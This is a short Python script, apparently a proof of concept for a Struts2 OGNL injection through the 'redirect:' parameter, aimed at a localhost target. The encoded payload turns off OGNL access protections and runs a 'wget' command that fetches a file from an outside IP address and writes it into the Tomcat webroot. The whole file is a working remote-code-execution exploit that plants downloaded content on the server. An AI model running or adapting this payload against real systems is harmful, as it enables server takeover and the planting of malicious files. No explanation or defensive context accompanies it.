# coding:utf-8
import requests

poc = "/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27wget http://172.22.209.33:8014/api/download -O /usr/local/tomcat/webapps/ROOT/swm.s1%27%29.getInputStream%28%29%29%7D"
url = "http://localhost:8089/default.action"
commandurl = url+poc
res = requests.get(commandurl, timeout=10)
print res.text